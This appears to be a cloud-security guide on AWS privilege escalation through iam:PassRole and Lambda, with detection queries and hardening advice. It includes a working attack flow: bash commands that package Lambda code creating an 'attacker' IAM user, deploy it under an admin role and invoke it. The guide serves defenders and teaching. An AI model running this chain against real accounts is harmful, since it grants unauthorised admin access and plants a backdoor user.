# 🧨 Privilege Escalation via `iam:PassRole` + Service Permissions

## 🎯 Use Case Summary

This attack exploits a fundamental design of AWS IAM: the ability to **delegate permissions through roles**. Specifically, it targets overly permissive use of `iam:PassRole`, which allows a user to hand off a role (often high-privilege) to a service like **Lambda**, **EC2**, or **Step Functions**.

In this scenario, an attacker compromises a low-privileged IAM user (e.g., a developer account) that has the ability to:

- Call `iam:PassRole` on an administrative role
- Launch a service that executes code using that role

By chaining these permissions, the attacker **indirectly assumes elevated privileges**, not by attaching policies to themselves, but by getting AWS to execute code on their behalf under a more powerful identity.

This is not a vulnerability in AWS — it’s a **misconfiguration and privilege escalation vector** that arises when users can pass roles they should not control.

---

## 🛠️ Example Setup

### 1. IAM Policy Assigned to User

This policy allows the user to create and invoke a Lambda function **using a high-privilege role**:

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": [
        "iam:PassRole"
      ],
      "Resource": "arn:aws:iam::123456789012:role/AdminRole"
    },
    {
      "Effect": "Allow",
      "Action": [
        "lambda:CreateFunction",
        "lambda:InvokeFunction"
      ],
      "Resource": "*"
    }
  ]
}
```

### 2. Attacker Exploit Flow

```bash
# Package malicious Lambda code (e.g., to create another IAM user or dump secrets)
echo 'exports.handler = async () => { require("child_process").exec("aws iam create-user --user-name attacker"); };' > index.js

zip function.zip index.js

# Upload and create the Lambda using the high-privilege role
aws lambda create-function \
  --function-name elevateMe \
  --zip-file fileb://function.zip \
  --handler index.handler \
  --runtime nodejs18.x \
  --role arn:aws:iam::123456789012:role/AdminRole

# Invoke it
aws lambda invoke --function-name elevateMe output.txt
```

This Lambda executes with the privileges of `AdminRole` — not the attacker’s user role.

---

## 📜 CloudTrail Evidence

Look for the following sequence in CloudTrail logs:

1. `CreateFunction` with a trusted role attached
2. `InvokeFunction` from an unprivileged principal
3. Privileged activity following Lambda execution

Sample CloudTrail log excerpt:

```json
{
  "eventName": "CreateFunction",
  "userIdentity": {
    "type": "IAMUser",
    "userName": "dev-user"
  },
  "requestParameters": {
    "role": "arn:aws:iam::123456789012:role/AdminRole"
  }
}
```

---

## 🔐 How to Secure Against This

### ✅ Best Practices

- **Limit **``** to only specific roles that are intended to be passed**
- **Use conditions** in the policy to enforce role tagging or service constraint:

```json
"Condition": {
  "StringEqualsIfExists": {
    "iam:PassedToService": "lambda.amazonaws.com"
  }
}
```

- Ensure that **high-privilege roles are not passable** by default — even by developers
- Use **Access Analyzer** to detect unintended cross-principal assumptions
- Log and monitor `iam:PassRole`, `CreateFunction`, `RunInstances`, etc.
- Enable **MFA** for sensitive users
- Implement **least privilege**: don’t allow users to launch compute with arbitrary roles

### 🚫 Anti-Patterns to Avoid

- Allowing `iam:PassRole` with `"Resource": "*"`
- Not scoping the `PassedToService` condition
- Overloading roles shared between services and humans

---

## 🔍 Detection Strategy

### Query (Athena / CloudTrail via SQL):

```sql
SELECT eventTime, userIdentity.arn, eventName, requestParameters.role
FROM cloudtrail_logs
WHERE eventName = 'CreateFunction'
  AND requestParameters.role LIKE '%AdminRole%'
ORDER BY eventTime DESC
```

### Alerting:

- Monitor:
  - `iam:PassRole`
  - `lambda:CreateFunction`, `ec2:RunInstances`
  - Any role assumption with elevated permissions

---

##

